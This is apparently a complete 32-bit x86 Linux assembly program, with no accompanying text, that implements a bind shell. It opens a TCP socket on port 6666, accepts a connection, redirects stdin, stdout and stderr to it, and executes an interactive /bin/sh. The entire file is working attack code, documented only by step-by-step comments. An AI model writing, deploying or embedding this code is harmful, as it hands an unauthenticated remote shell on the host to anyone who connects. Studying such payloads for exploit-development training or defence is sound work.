.section .text
.global _start

socketcall:
    push %ebp
    mov %esp, %ebp

    push %eax
    push %ebx
    push %ecx

    mov $0x66, %eax
    mov 8(%ebp), %ebx     # num
    mov 12(%ebp), %ecx    # param
    int $0x80

    # save return value in edx temporarily
    mov %eax, %edx

    pop %ecx
    pop %ebx
    pop %eax

    # set return value
    mov %edx, %eax

    mov %ebp, %esp
    pop %ebp
    ret

_start:
    # socket_param
    sub $12, %esp
    movl $2, 0(%esp)
    movl $1, 4(%esp)
    movl $6, 8(%esp)

    # soc = socketcall(1, socket_param)
    mov %esp, %eax        # socket_param address
    push %eax
    push $1
    call socketcall
    add $8, %esp
    mov %eax, %edi        # save soc in %edi
    add $12, %esp         # free socket_param

    # serv_addr
    sub $16, %esp
    movw $0x0002, 0(%esp)
    movw $0x0a1a, 2(%esp)
    movl $0, 4(%esp)
    movl $0, 8(%esp)
    movl $0, 12(%esp)

    # bind_param [soc, &serv_addr, 16]
    sub $12, %esp
    movl %edi, 0(%esp)           # soc
    lea 12(%esp), %eax
    movl %eax, 4(%esp)           # &serv_addr
    movl $16, 8(%esp)            # sizeof(serv_addr)

    # socketcall(2, bind_param)
    mov %esp, %eax              # &bind_param
    push %eax
    push $2
    call socketcall
    add $8, %esp
    add $12, %esp               # free bind_param
    add $16, %esp               # free serv_addr

    # listen_param [soc, 1]
    sub $8, %esp
    movl %edi, 0(%esp)
    movl $1, 4(%esp)

    # socketcall(4, listen_param)
    mov %esp, %eax             # &listen_param
    push %eax
    push $4
    call socketcall
    add $8, %esp
    add $8, %esp               # free listen_param

    # accept_param [soc, NULL, NULL]
    sub $12, %esp
    movl %edi, 0(%esp)
    movl $0, 4(%esp)
    movl $0, 8(%esp)

    # soc = socketcall(5, accept_param)
    mov %esp, %eax            # &accept_param
    push %eax
    push $5
    call socketcall
    add $8, %esp
    mov %eax, %edi           # replace soc
    add $12, %esp            # free accept_param

    # dup2(soc, 0)
    mov $63, %eax
    mov %edi, %ebx
    xor %ecx, %ecx
    int $0x80

    # dup2(soc, 1)
    mov $63, %eax
    mov %edi, %ebx
    mov $1, %ecx
    int $0x80

    # dup2(soc, 2)
    mov $63, %eax
    mov %edi, %ebx
    mov $2, %ecx
    int $0x80

    # execve("/bin/sh", ["/bin/sh", "-i", NULL], NULL)
    # "/bin/sh\0"
    push $0x0068732f        # "/sh\0"
    push $0x6e69622f        # "/bin"
    mov %esp, %ebx          # 1rst arg: "/bin/path"

    # "-i\0"
    xor %eax, %eax
    push %eax
    push $0x692d
    mov %esp, %esi

    # fill argv[]
    xor %eax, %eax
    push %eax               # argv[2] = NULL
    push %esi               # argv[1] = "-i"
    push %ebx               # argv[0] = "/bin/sh"
    mov %esp, %ecx          # 2nd arg: argv

    # execve
    xor %edx, %edx          # 3rd arg: envp = NULL
    mov $11, %eax           # execve syscall
    int $0x80

    # exit(0)
    mov $1, %eax
    xor %ebx, %ebx
    int $0x80
